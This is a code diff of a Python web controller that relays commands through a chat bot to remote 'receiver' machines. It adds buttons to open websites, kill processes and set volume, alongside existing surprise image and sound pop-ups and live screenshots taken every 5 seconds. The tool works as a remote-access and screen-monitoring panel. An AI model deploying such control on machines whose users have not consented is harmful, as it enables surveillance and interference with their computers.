@@ -151,53 +151,77 @@ CONTROL_HTML = """<!doctype html>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Controller</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #0f172a; color: #e2e8f0; margin: 0; padding: 20px; }
-    .card { max-width: 700px; background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.35); margin-bottom: 16px; }
-    h1 { margin: 0 0 12px; font-size: 20px; }
-    label { display: block; margin-bottom: 8px; color: #cbd5e1; }
-    input[type=file] { width: 100%; margin-bottom: 12px; color: #e2e8f0; }
-    button { cursor: pointer; background: #22d3ee; color: #0b1224; border: none; border-radius: 8px; padding: 10px 14px; font-weight: 600; }
-    button.secondary { background: #ef4444; color: #fff; }
-    .row { display: flex; gap: 10px; align-items: center; }
-    small { color: #94a3b8; }
-    img { max-width: 100%; border-radius: 8px; border: 1px solid #1f2937; }
+    :root { --bg:#07030f; --card:#0e0a1a; --border:#21183a; --accent:#9b5cff; --accent2:#6b21ff; --text:#e7e7ff; --muted:#b8b5d3; --danger:#ef4444; --success:#22c55e; }
+    body { font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle at 20% 20%, rgba(107,33,255,0.15), transparent 25%), radial-gradient(circle at 80% 0%, rgba(155,92,255,0.15), transparent 25%), var(--bg); color: var(--text); margin: 0; padding: 24px; }
+    .layout { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 16px; align-items: start; }
+    .card { background: linear-gradient(145deg, rgba(14,10,26,0.92), rgba(18,14,30,0.95)); border: 1px solid var(--border); border-radius: 14px; padding: 18px; box-shadow: 0 10px 35px rgba(0,0,0,0.35); }
+    h1 { margin: 0 0 12px; font-size: 18px; letter-spacing: 0.3px; }
+    label { display: block; margin-bottom: 6px; color: var(--muted); font-size: 13px; }
+    input, button { font-family: inherit; }
+    input[type=file], input[type=text], input[type=number] { width: 100%; margin-bottom: 10px; padding: 10px; border-radius: 10px; border: 1px solid var(--border); background: #0c0817; color: var(--text); }
+    button { cursor: pointer; background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #0b0419; border: none; border-radius: 10px; padding: 10px 14px; font-weight: 700; letter-spacing: 0.3px; }
+    button.secondary { background: #180f2c; color: var(--text); border: 1px solid var(--border); }
+    .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+    small { color: var(--muted); }
+    img { max-width: 100%; border-radius: 10px; border: 1px solid var(--border); }
+    .pill { padding: 8px 12px; border-radius: 999px; border: 1px solid var(--border); background: #0c0817; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Display Surprise</h1>
-    <p style="margin: 4px 0 12px; color:#cbd5e1;">Sends local <code>suprise.png</code>/<code>surprise.png</code> and <code>sound.mp3</code> to the receiver and triggers display.</p>
-    <div class="row">
-      <form method="post" action="/ui/surprise">
-        <button type="submit">Send & Display</button>
+  <div class="layout">
+    <div class="card">
+      <h1>Display Surprise</h1>
+      <p style="margin: 4px 0 12px; color:var(--muted);">Sends local <code>suprise.png</code>/<code>surprise.png</code> and <code>sound.mp3</code> to the receiver and triggers display.</p>
+      <div class="row">
+        <form method="post" action="/ui/surprise">
+          <button type="submit">Send & Display</button>
+        </form>
+        <form method="post" action="/ui/gif/stop">
+          <button class="secondary" type="submit">Stop Display</button>
+        </form>
+      </div>
+    </div>
+    <div class="card">
+      <h1>Select Receiver</h1>
+      <div id="receiver-buttons" class="row" style="flex-wrap: wrap;"></div>
+      <div style="margin-top:10px; font-size:13px; color:var(--muted);">Offline</div>
+      <div id="receiver-offline" class="row" style="flex-wrap: wrap;"></div>
+    </div>
+    <div class="card">
+      <h1>Open & Close :3</h1>
+      <form method="post" action="/ui/open">
+        <label for="url">Open website</label>
+        <input id="url" name="url" type="text" placeholder="https://google.com" required>
+        <button type="submit">Open</button>
       </form>
-      <form method="post" action="/ui/gif/stop">
-        <button class="secondary" type="submit">Stop Display</button>
+      <form method="post" action="/ui/close" style="margin-top:12px;">
+        <label for="proc">Close process (name.exe)</label>
+        <input id="proc" name="proc" type="text" placeholder="chrome.exe" required>
+        <button class="secondary" type="submit">Close</button>
       </form>
     </div>
-  </div>
-  <div class="card">
-    <h1>Select Receiver</h1>
-    <div id="receiver-buttons" class="row" style="flex-wrap: wrap;"></div>
-    <div id="receiver-offline" class="row" style="flex-wrap: wrap; margin-top:10px;"></div>
-    <form method="post" action="/ui/rename" style="margin-top:12px; display:flex; gap:8px; align-items:center;">
-      <input name="new_name" type="text" placeholder="Rename selected" required style="flex:1; padding:8px; border-radius:8px; border:1px solid #1f2937; background:#0b1224; color:#e2e8f0;">
-      <button type="submit">Rename</button>
-    </form>
-  </div>
-  <div class="card">
-    <h1>Live Screen (5s)</h1>
-    <p style="margin: 4px 0 12px; color:#cbd5e1;">Latest screenshot posted by receiver every 5 seconds.</p>
-    <div id="screen-wrap">
-      <img id="screen-img" src="" alt="Waiting for screenshot..." />
+    <div class="card">
+      <h1>Volume ;0</h1>
+      <form method="post" action="/ui/volume">
+        <label for="level">Set volume (0-100)</label>
+        <input id="level" name="level" type="number" min="0" max="100" step="1" value="50" required>
+        <button type="submit">Set Volume</button>
+      </form>
     </div>
-    <div class="row" style="margin-top:10px;">
-      <form method="post" action="/ui/live/start">
-        <button type="submit">Start Live</button>
-      </form>
-      <form method="post" action="/ui/live/stop">
-        <button class="secondary" type="submit">Stop Live</button>
-      </form>
+    <div class="card">
+      <h1>Live Screen (5s)</h1>
+      <p style="margin: 4px 0 12px; color:var(--muted);">Latest screenshot posted by receiver every 5 seconds.</p>
+      <div id="screen-wrap">
+        <img id="screen-img" src="" alt="Waiting for screenshot..." />
+      </div>
+      <div class="row" style="margin-top:10px;">
+        <form method="post" action="/ui/live/start">
+          <button type="submit">Start Live</button>
+        </form>
+        <form method="post" action="/ui/live/stop">
+          <button class="secondary" type="submit">Stop Live</button>
+        </form>
+      </div>
     </div>
   </div>
   <script>
@@ -298,11 +322,13 @@ async def _send_cmd_with_files(msg: str, file_paths: list[Path]):
         return
     await ch.send(content=msg, files=files)
 
-def _cmd_with_selection(cmd: str) -> str:
+def _cmd_with_selection(cmd: str, *args: str) -> str:
+    parts = [BOT_TAG, cmd]
     if _selected_receiver and _selected_receiver in _receivers:
         tag = _receivers[_selected_receiver].get("name") or _receivers[_selected_receiver].get("tag")
-        return f"{BOT_TAG} {cmd} {tag} {_selected_receiver}"
-    return f"{BOT_TAG} {cmd}"
+        parts.extend([tag, _selected_receiver])
+    parts.extend(args)
+    return " ".join(parts)
 
 @app.post("/cmd/gif/start")
 async def gif_start():
@@ -364,6 +390,42 @@ async def ui_live_stop():
     await _send_cmd(_cmd_with_selection("LIVE_STOP"))
     return RedirectResponse(url="/", status_code=303)
 
+@app.post("/ui/open")
+async def ui_open(request: Request):
+    url = None
+    try:
+        form = await request.form()
+        url = form.get("url")
+    except Exception:
+        url = request.query_params.get("url")
+    if url:
+        await _send_cmd(_cmd_with_selection("OPEN_LINK", url))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/close")
+async def ui_close(request: Request):
+    proc = None
+    try:
+        form = await request.form()
+        proc = form.get("proc")
+    except Exception:
+        proc = request.query_params.get("proc")
+    if proc:
+        await _send_cmd(_cmd_with_selection("KILL_PROCESS", proc))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/volume")
+async def ui_volume(request: Request):
+    level = None
+    try:
+        form = await request.form()
+        level = form.get("level")
+    except Exception:
+        level = request.query_params.get("level")
+    if level:
+        await _send_cmd(_cmd_with_selection("SET_VOLUME", level))
+    return RedirectResponse(url="/", status_code=303)
+
 @app.post("/ui/select/{tag}")
 async def ui_select(tag: str):
     global _selected_receiver
@@ -372,24 +434,6 @@ async def ui_select(tag: str):
         _save_state()
     return RedirectResponse(url="/", status_code=303)
 
-@app.post("/ui/rename")
-async def ui_rename(request: Request):
-    global _selected_receiver
-    new_name = None
-    try:
-        form = await request.form()
-        new_name = form.get("new_name")
-    except Exception:
-        # fall back to query params if form parsing failed (e.g., multipart lib missing)
-        new_name = request.query_params.get("new_name")
-    if not new_name:
-        new_name = request.query_params.get("new_name")
-
-    if _selected_receiver and _selected_receiver in _receivers and new_name:
-        _receivers[_selected_receiver]["name"] = new_name
-        _save_state()
-        await _send_cmd(f"{BOT_TAG} SET_NAME {_selected_receiver} {new_name}")
-    return RedirectResponse(url="/", status_code=303)
 
 # ---------------- STARTUP ----------------
 @app.on_event("startup")
